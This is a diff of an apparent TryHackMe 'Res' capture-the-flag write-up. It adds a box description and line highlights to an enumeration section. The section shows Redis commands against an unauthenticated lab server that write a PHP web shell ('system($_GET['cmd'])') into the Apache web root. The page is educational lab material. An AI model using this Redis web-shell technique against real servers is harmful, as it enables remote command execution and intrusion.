@@ -4,8 +4,14 @@ description: Res
 keywords: [res, tryhackme, ctf, pentesting, guide, docs, tutorial, enumeration, exploitation, nmap, redis exploit, privilege escalation, php exploitation redis]
 ---
 
-
 # Enumeration
+
+:::note Box Description
+
+Hack into a vulnerable database server with an in-memory data-structure in this semi-guided challenge!
+
+:::
+
 
 ## NMAP
 
@@ -27,17 +33,21 @@ PORT     STATE SERVICE VERSION
 `Redis` Server Requires no **Authentication.**
 
 - We know the Default `Apache2` Site Folder: **`/var/www/html`** 
-- Creating a `WebShell:`
+- We can set some parameters to create a `WebShell`
+
 
 ```php
 attacker@machine:~$ redis -h 10.10.150.201
+// highlight-next-line
 10.10.150.201:6379> config set dir /var/www/html
 OK
+// highlight-next-line
 10.10.150.201:6379> config set dbfilename web_shell.php
 OK
 // highlight-next-line
 10.10.150.201:6379> set test "<?php system($_GET['cmd']);?>"
 OK
+// highlight-next-line
 10.10.150.201:6379> save
 OK
 10.10.150.201:6379> exit
